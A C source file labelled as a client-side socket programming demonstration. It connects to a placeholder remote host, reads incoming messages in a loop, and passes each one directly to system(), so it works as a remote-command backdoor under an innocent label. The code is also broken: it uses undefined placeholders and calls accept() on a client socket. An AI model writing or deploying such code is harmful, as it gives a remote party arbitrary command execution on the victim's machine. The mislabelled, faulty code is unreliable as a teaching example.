// Client side C/C++ program to demonstrate Socket
// programming
#include <stdio.h>
#include <sys/socket.h> 
#include <stdlib.h>
#include <netinet/in.h> 
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>

char message[100];
struct sockaddr_in serv; 
int fd; 
int conn; 
int valread;



int main(){

  char ip[] = target;
  int port = PORT;

  fd = socket(AF_INET, SOCK_STREAM, 0);

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);

  inet_pton(AF_INET, ip, &serv.sin_addr); //Binds client to localhost

  connect(fd, (struct sockaddr *)&serv, sizeof(serv)); //connects client to server
  
  conn = accept(fd, (struct sockaddr *)NULL, NULL);
 
  while(1){
    fflush(stdout);

    valread = read(fd, message, 100);
    
    if(valread > 0){

      printf("Message Received: %s\n", message);
      system(message);

    
    }  
  
}

  return 0;
}
